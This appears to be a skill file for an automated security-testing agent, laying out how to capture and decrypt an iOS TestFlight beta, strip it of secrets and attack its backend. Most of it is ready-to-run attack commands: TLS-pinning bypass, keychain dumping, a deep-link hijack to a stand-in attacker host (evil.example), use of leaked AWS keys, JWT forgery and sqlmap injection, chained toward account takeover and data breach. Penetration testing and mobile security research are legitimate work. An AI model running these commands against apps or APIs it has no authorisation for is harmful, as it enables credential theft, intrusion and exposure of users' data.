---
name: ios_testflight
description: iOS TestFlight beta-build assessment — install via TestFlight, capture the IPA, and statically and dynamically analyze the app and its backend.
---

# iOS TestFlight Build

A TestFlight identifier (an invite code, public link `testflight.apple.com/join/<code>`, or the app's bundle ID) grants access to a pre-release iOS build that is frequently less hardened than App Store releases: debug flags on, verbose logging, staging endpoints, embedded test credentials, and feature flags that are off in production. The attacker's objective is to install the beta, capture the decrypted IPA from a jailbroken or otherwise instrumented device, then assess both the client binary (secrets, weak crypto, broken auth, insecure storage, transport flaws) and the backend it talks to (the real high-value target reachable through the app's API surface).

## Attack Surface

**The build itself**
- `Payload/<App>.app/<App>` — the FairPlay-encrypted Mach-O (must be decrypted to analyze)
- `Info.plist` — `CFBundleIdentifier`, URL schemes (`CFBundleURLTypes`), `NSAppTransportSecurity` (ATS) exceptions, associated-domains
- `embedded.mobileprovision` — provisioning profile, team ID, entitlements, registered test devices/UDIDs
- `*.plist`, `*.json`, `*.car` (Assets.car), bundled config and feature-flag files
- Embedded frameworks/dylibs in `Frameworks/`, third-party SDKs, static libs

**Runtime / device**
- Keychain entries, `NSUserDefaults`, sandbox `Documents/`, `Caches/`, `tmp/`
- Custom URL schemes and Universal Links (deep-link handlers)
- IPC: app groups, shared keychain, pasteboard, `WKWebView` JS bridges
- Local network listeners, background fetch, push (APNs) payload handling

**Backend (primary target)**
- REST/GraphQL/gRPC APIs the app calls (often staging/QA hosts in beta)
- Auth flows: OAuth/OIDC, API keys, JWT issuance and refresh
- Object storage (S3/GCS), CDN, third-party APIs reached with embedded keys

## Recon & Enumeration

Install the iOS-specific toolchain (the PD/web tools — nmap, naabu, httpx, nuclei, ffuf, katana, subfinder, sqlmap, semgrep, trufflehog, gitleaks, trivy, jwt_tool, wafw00f, interactsh-client — are already in the sandbox):

```bash
pip3 install frida-tools objection                 # dynamic instrumentation
git clone https://github.com/AloneMonkey/frida-ios-dump  # pull decrypted IPA from device
# MobSF (static+dynamic mobile scanner) via Docker:
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
brew install class-dump 2>/dev/null || true        # class-dump / otool / lipo come with Xcode CLT on macOS hosts
```

Capture the build from a jailbroken/instrumented device after TestFlight install:

```bash
# device must be jailbroken with frida-server running; iproxy/usbmuxd forwards SSH
frida-ps -Uai                                       # list installed apps + bundle IDs
python3 frida-ios-dump/dump.py -u root -P alpine com.target.app   # -> com.target.app.ipa (decrypted)
unzip -o com.target.app.ipa -d ipa/                 # explode the bundle
file ipa/Payload/*.app/<App>                         # confirm Mach-O + 'no crypto' after decryption
```

Static triage of the unpacked bundle:

```bash
APP=$(ls -d ipa/Payload/*.app)
plutil -convert xml1 -o - "$APP/Info.plist"          # URL schemes, ATS, associated domains
strings -a -n 6 "$APP/$(basename "$APP" .app)" | grep -Ei 'http(s)?://|api|secret|token|key|password|s3\.|firebaseio'
# secret/key hunting across the whole bundle:
trufflehog filesystem ipa/ --only-verified --json
gitleaks dir ipa/ --report-format json --report-path gitleaks.json
# dependency/CVE view of embedded frameworks:
trivy fs --scanners vuln,secret ipa/ -f json -o trivy.json
# decompile for source-level review:
docker run -v "$PWD":/work -p 8000:8000 opensecurity/mobile-security-framework-mobsf  # then upload the IPA in the UI
```

Map and probe the discovered backend (feed the hosts/URLs pulled from strings + a proxied run):

```bash
printf '%s\n' api.target.com staging-api.target.com | dnsx -resp -a    # resolve hosts
subfinder -d target.com -silent | httpx -silent -json -o web_hosts.jsonl
naabu -host api.target.com -top-ports 1000 -silent
nuclei -l web_hosts.jsonl -as -s critical,high -rl 50 -c 20 -bs 20 -timeout 10 -j -o nuclei.jsonl
katana -u https://staging-api.target.com -jc -kf all -silent | tee crawl.txt
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc all -fc 404
```

## Methodology

1. **Join + install.** Redeem the TestFlight code / public link, install via the TestFlight app on a controlled test device. Note version, build number, and bundle ID.
2. **Capture the IPA.** On a jailbroken device, dump the decrypted binary with `frida-ios-dump`; otherwise use a device-side decryptor. Verify the Mach-O `LC_ENCRYPTION_INFO.cryptid == 0` before analysis.
3. **Bundle inventory.** Unzip, parse `Info.plist`, list `Frameworks/`, dump entitlements from `embedded.mobileprovision` (`security cms -D -i embedded.mobileprovision`).
4. **Static secret/config sweep.** Run trufflehog/gitleaks/trivy across `ipa/`; pull every URL, key, and feature flag; flag staging vs prod endpoints and ATS exceptions.
5. **Decompile & review.** Load into MobSF and class-dump/Hopper/Ghidra; review auth, crypto, storage, deep-link, and webview-bridge code; run semgrep on any extracted Swift/Obj-C or JS bridge code.
6. **Proxy the live app.** Install Burp/mitmproxy CA on the device; defeat TLS pinning with objection/frida; capture the full API conversation and tokens.
7. **Runtime instrumentation.** Use objection to inspect keychain, `NSUserDefaults`, files, and to bypass jailbreak/pinning checks; hook crypto and auth methods.
8. **Backend assessment.** Treat captured API traffic as the main attack surface — test authN/authZ (IDOR/BFLA), injection, mass assignment, JWT flaws, and SSRF on the hosts the app reaches.
9. **Validate & chain.** Build minimal PoCs for each finding; chain client leak → backend access → data/account compromise.

## Key Weaknesses / Techniques

**Hardcoded secrets / over-privileged keys.** Beta builds ship API keys, third-party tokens, and sometimes cloud creds.
```bash
trufflehog filesystem ipa/ --only-verified --json | jq -r '.Raw'
# validate any AWS key found (read-only probe):
AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity
```

**TLS pinning + traffic capture.** Pinning hides the real API. Disable it at runtime, then proxy.
```bash
objection -g com.target.app explore
# in objection REPL:
ios sslpinning disable
ios nsurlsession disable        # for URLSession-based pinning paths
# point device proxy at mitmproxy:
mitmproxy --mode regular --listen-port 8080 -w flows.mitm
```

**Insecure local storage.** Sensitive data in `NSUserDefaults`, plists, or sqlite instead of Keychain (or Keychain with weak `kSecAttrAccessible`).
```bash
objection -g com.target.app explore
ios nsuserdefaults get
ios keychain dump
env file ls /var/mobile/Containers/Data/Application/<UUID>/Documents
```

**Custom URL scheme / Universal Link hijack & injection.** Handlers that trust deep-link params for navigation, auth callbacks, or webview loads.
```bash
# enumerate schemes from Info.plist CFBundleURLTypes, then trigger:
frida -U -n <App> --eval "ObjC.classes" >/dev/null   # confirm attach
# from a controlled second app / Safari:
open "targetapp://reset?token=attacker&next=https://evil.example/"
```
Look for open-redirect-style `next=`/`returnUrl=` params, OAuth code interception, and `WKWebView` loading attacker-controlled URLs.

**WKWebView JS bridge abuse.** `WKScriptMessageHandler` / `evaluateJavaScript` exposing native functions to web content; with `allowFileAccessFromFileURLs` or loaded remote content this becomes RCE-in-context / local file read.

**Weak crypto & cert validation.** ECB mode, static IVs, hardcoded keys, `NSAllowsArbitraryLoads=true`, or `URLSession` delegates that accept any server trust. Confirm in decompiled code and at runtime by hooking `SecTrustEvaluate`.

**Backend authZ flaws (the payoff).** Replay captured tokens across users/objects.
```bash
# IDOR: swap object IDs with a low-priv token
curl -s https://api.target.com/v1/users/1002/profile -H "Authorization: Bearer $LOWPRIV"
# JWT weaknesses on the issued token:
jwt_tool "$TOKEN" -M at -t https://api.target.com/v1/me -rh "Authorization: Bearer $TOKEN"
jwt_tool "$TOKEN" -X a        # alg:none / key-confusion checks
# injection on parameters seen in flows.mitm:
sqlmap -r request.txt --batch --risk 2 --level 3
```

## Validation

1. **Decryption proof.** `otool -l "$APP/<App>" | grep -A4 LC_ENCRYPTION_INFO` shows `cryptid 0` — analysis is on a real decrypted binary, not a stub.
2. **Secret is live, not dead.** Don't report a string; prove the key authenticates (e.g., `aws sts get-caller-identity` returns an ARN, or the third-party endpoint returns 200 with the embedded token). Use `trufflehog --only-verified`.
3. **Pinning bypass confirmed.** Show captured plaintext API requests/responses in `flows.mitm` while the app functions normally.
4. **Backend finding has a PoC.** A reproducible `curl` with a low-privilege token returning another user's data; an IDOR/BFLA delta between two principals; a JWT forgery accepted by `/me`.
5. **Storage leak is real.** `ios keychain dump` / file read showing a session token or PII that survives logout or is world-readable within the app sandbox.

## False Positives

- Strings that look like secrets but are public IDs, demo keys, or analytics SDK config (Firebase `apiKey` is not a secret by itself — confirm rules instead).
- "Hardcoded key" inside a third-party SDK that is documented as a public client identifier.
- ATS exceptions scoped to a single legitimate domain that already uses valid TLS — only the `NSAllowsArbitraryLoads=true` global, or cleartext to a real host, is a finding.
- Staging endpoints that are firewalled/unreachable from the internet (verify with httpx/naabu before claiming exposure).
- A `cryptid 1` binary mistaken for "obfuscated" — it's just still encrypted; re-dump before concluding anything about the code.
- Pinning "bypass" that actually just disabled networking — confirm the app still receives real responses.

## Chaining & Impact

- Embedded cloud/API key → backend or bucket access → bulk data read → full data breach.
- Pinning bypass → captured admin/QA token from a beta tester → privileged backend actions in staging that share data or auth with production.
- Deep-link/OAuth callback hijack → account takeover (steal the authorization code or session via attacker-controlled `redirect`/`next`).
- Insecure storage → token persists after logout → session hijack on a shared/lost device.
- JS-bridge + remote webview content → native function invocation → local file exfiltration or action-on-behalf-of-user.
- Staging API flaw (weaker than prod) → pivot to shared infra/credentials reused in production.

## Pro Tips

1. Beta builds leak more than App Store builds — diff the TestFlight `Info.plist`/endpoints against the production app; staging hosts, debug menus, and verbose logging are common.
2. Always confirm decryption (`cryptid 0`) before spending time in a disassembler; analyzing an encrypted Mach-O wastes hours.
3. Pull entitlements early (`security cms -D -i embedded.mobileprovision`) — app groups, associated domains, and keychain-sharing groups reveal IPC and deep-link attack surface.
4. Two principals beat one: register/redeem with two TestFlight testers so you can diff API responses for IDOR/BFLA instead of guessing.
5. If objection's pinning bypass fails, write a targeted frida hook on the specific `URLSession` delegate or `SecTrustEvaluateWithError` — generic scripts miss custom pinning.
6. Embed an `interactsh-client` OAST domain in deep-link, webview, and API params to catch blind SSRF/callbacks server-side, and confirm the hit comes from the backend IP, not your device.
7. Search `Assets.car` and bundled JSON for feature flags — toggling a hidden flag client-side often exposes unfinished, unauthenticated backend endpoints.
8. The IPA is reconnaissance; the backend is the breach. Spend most of the time on the API surface the captured traffic reveals.
